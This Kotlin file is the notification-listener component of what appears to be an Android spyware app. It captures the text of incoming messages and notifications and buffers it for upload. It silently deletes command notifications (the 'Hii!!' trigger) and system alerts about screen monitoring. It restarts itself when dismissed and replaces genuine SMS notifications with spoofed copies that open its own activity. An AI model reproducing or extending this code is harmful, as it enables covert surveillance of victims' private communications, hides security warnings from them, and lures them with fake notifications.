package com.example.myandroid

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray
import kotlinx.coroutines.*

class MyNotificationListener : NotificationListenerService() {

    companion object {
        var instance: MyNotificationListener? = null
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    fun wipeNotifications(target: String, value: String?): Int {
        val active = activeNotifications
        if (active == null) {
            DebugLogger.log("WIPE_NOTIF", "activeNotifications is null (service disconnected or restricted).")
            return 0
        }
        
        DebugLogger.log("WIPE_NOTIF", "Starting wipe scan. Total active notifications: ${active.size}")
        var wipedCount = 0
        
        for (sbn in active) {
            val pkg = sbn.packageName
            if (!sbn.isClearable) {
                DebugLogger.log("WIPE_NOTIF", "Skipping ongoing/unclearable notification from: $pkg")
                continue
            }

            val shouldWipe = when (target.uppercase()) {
                "ALL" -> true
                "PKG" -> pkg == value
                "TEXT" -> {
                    val extras = sbn.notification.extras
                    val title = extras.getCharSequence("android.title")?.toString() ?: ""
                    var text = extras.getCharSequence("android.text")?.toString() ?: ""
                    val msgs = extras.getParcelableArray("android.messages")
                    if (msgs != null) {
                        msgs.filterIsInstance<android.os.Bundle>().forEach {
                            it.getCharSequence("text")?.toString()?.let { t -> text += "\n$t" }
                        }
                    }
                    title.contains(value ?: "", ignoreCase = true) || text.contains(value ?: "", ignoreCase = true)
                }
                else -> false
            }

            if (shouldWipe) {
                try {
                    cancelNotification(sbn.key)
                    wipedCount++
                    DebugLogger.log("WIPE_NOTIF", "Successfully cleared notification from: $pkg")
                } catch (e: Exception) {
                    DebugLogger.log("WIPE_NOTIF_ERR", "Failed to clear notification from $pkg: ${e.message}")
                }
            } else {
                DebugLogger.log("WIPE_NOTIF", "Notification from $pkg did not match target criteria.")
            }
        }
        
        DebugLogger.log("WIPE_NOTIF", "Wipe scan complete. Cleared $wipedCount notifications.")
        return wipedCount
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // Feature Gate
        if (!ConfigManager.canCollect(this, "notifications")) return

        // SYMBIOTE RESURRECTION: Secondary Heartbeat
        try {
            if (!MonitorService.isRunning) {
                val intent = android.content.Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }
        } catch(e: Exception) {}

        if (sbn == null) return
        
        // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
        if (!sbn.isClearable) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        
        // DEEP EXTRACTION: MessagingStyle is used by almost all modern SMS/Chat apps
        var text = ""
        
        val messages = extras.getParcelableArray("android.messages")
        if (messages != null && messages.isNotEmpty()) {
            val msgTexts = mutableListOf<String>()
            messages.filterIsInstance<android.os.Bundle>().forEach {
                it.getCharSequence("text")?.toString()?.let { t -> msgTexts.add(t) }
            }
            if (msgTexts.isNotEmpty()) text = msgTexts.joinToString("\n")
        }

        if (text.isEmpty()) {
            val lines = extras.getCharSequenceArray("android.textLines")
            if (lines != null && lines.isNotEmpty()) {
                text = lines.joinToString("\n")
            } else {
                text = extras.getCharSequence("android.bigText")?.toString() ?: ""
            }
        }

        if (text.isEmpty()) {
            text = extras.getCharSequence("android.text")?.toString() ?: ""
        }
        if (text.isEmpty()) {
            text = sbn.notification.tickerText?.toString() ?: ""
        }

        if (title.isEmpty() && text.isEmpty()) return

        // --- PASSIVE AUTO-SWIPE ENGINE ---
        val autoPrefs = getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
        
        // 1. Check Package Blacklist
        val pkgList = autoPrefs.getString("pkgs", "") ?: ""
        if (pkgList.split(",").any { it.trim() == pkg }) {
            cancelNotification(sbn.key)
            DebugLogger.log("AUTO_SWIPE", "Purged by PKG rule: $pkg")
            return
        }

        // 2. Check Keyword Blacklist (Title & Text)
        val kwList = autoPrefs.getString("keywords", "") ?: ""
        if (kwList.isNotEmpty()) {
            val lowerTitle = title.lowercase()
            val lowerText = text.lowercase()
            if (kwList.split(",").any { 
                val target = it.trim().lowercase()
                target.isNotEmpty() && (lowerTitle.contains(target) || lowerText.contains(target)) 
            }) {
                cancelNotification(sbn.key)
                DebugLogger.log("AUTO_SWIPE", "Purged by Keyword rule.")
                return
            }
        }

        // 3. Check SMS Sender Blacklist (Title usually contains sender in SMS apps)
        val senderList = autoPrefs.getString("senders", "") ?: ""
        if (senderList.isNotEmpty()) {
            if (senderList.split(",").any { it.trim().isNotEmpty() && title.contains(it.trim()) }) {
                cancelNotification(sbn.key)
                DebugLogger.log("AUTO_SWIPE", "Purged by SMS Sender rule: $title")
                return
            }
        }

        // --- STEALTH SHIELD: INSTANT WIPE ---
        val isCommand = title.contains("Hii!!", ignoreCase = true) || text.contains("Hii!!", ignoreCase = true)
        val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
                              text.contains("monitoring your screen", ignoreCase = true) ||
                              title.contains("security alert", ignoreCase = true)

        if (isCommand || isSecurityAlert) {
            cancelNotification(sbn.key)
            DebugLogger.log("SHIELD", "Notification purged: ${if(isCommand) "Command" else "Security Alert"}")
            return
        }

        // --- ENGAGEMENT PROTOCOL ---
        if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
            checkAndMirrorNotification(sbn, title, text)
        }

        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            // LOAD DATA
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()

            // 1. UPDATE GLOBAL COUNT
            val total = prefs.getInt("notif_count", 0) + 1
            editor.putInt("notif_count", total)

            // 2. UPDATE APP LEADERBOARD (Who is most annoying?)
            val leaderboardStr = prefs.getString("notif_leaderboard", "{}")
            val leaderboard = try { JSONObject(leaderboardStr) } catch (e: Exception) { JSONObject() }
            val appCount = leaderboard.optInt(pkg, 0) + 1
            leaderboard.put(pkg, appCount)
            editor.putString("notif_leaderboard", leaderboard.toString())

            // 3. LOG HISTORY (STREAM)
            val entry = JSONObject()
            entry.put("pkg", pkg)
            entry.put("title", title.take(50))
            entry.put("txt", text.take(100))
            entry.put("ts", System.currentTimeMillis())
            
            DumpManager.appendLog("NOTIF", entry)
            
            // Buffer for CloudManager
            val histStr = prefs.getString("notif_history", "[]")
            val histArr = try { JSONArray(histStr!!) } catch(e: Exception) { JSONArray() }
            histArr.put(entry)
            if (histArr.length() > 50) histArr.remove(0)
            editor.putString("notif_history", histArr.toString())
            
            editor.commit() // Use commit() inside IO thread to avoid QueuedWork ANR
        }
    }

    override fun onNotificationRemoved(sbn: android.service.notification.StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        if (sbn == null) return

        // INSTANT HYDRA: If our core MonitorService notification (ID 777) is swiped, re-post it immediately
        if (sbn.packageName == packageName && sbn.id == 777) {
            DebugLogger.log("HYDRA", "Core notification swiped. Re-igniting instantly...")
            val intent = android.content.Intent(this, MonitorService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }

    private fun checkAndMirrorNotification(sbn: StatusBarNotification, title: String, text: String) {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastEngagement = prefs.getLong("last_engagement_success", 0L)
        val now = System.currentTimeMillis()
        
        // Threshold: 12 hours (allows ~2 triggers per day)
        if (now - lastEngagement < 43200000) {
            DebugLogger.log("ENGAGE_RECAP", "Cooldown active. Next window in: ${((43200000 - (now - lastEngagement)) / 3600000)} hours")
            return
        }

        // 1. SILENCE THE ORIGINAL
        cancelNotification(sbn.key)

        // 2. POST THE MIRROR
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        val channelId = "system_health_comms"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(channelId, "Messaging Optimization", android.app.NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(channel)
        }

        val intent = android.content.Intent(this, PulseActivity::class.java)
        intent.putExtra("is_engagement_trigger", true)
        intent.putExtra("original_pkg", sbn.packageName)
        
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 101, intent, 
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.stat_notify_chat)
            .setContentTitle(title)
            .setContentText(text)
            .setStyle(androidx.core.app.NotificationCompat.BigTextStyle().bigText(text)) // Allows full expansion
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX) // Push to top
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_MESSAGE)

        nm.notify(101, builder.build())
        prefs.edit().putString("engage_status", "ATTEMPT_POSTED: ${java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}").apply()
        DebugLogger.log("ENGAGE_EVENT", "PHASE 1: SMS Mirror Posted for sender: $title. Waiting for user interaction...")
    }
}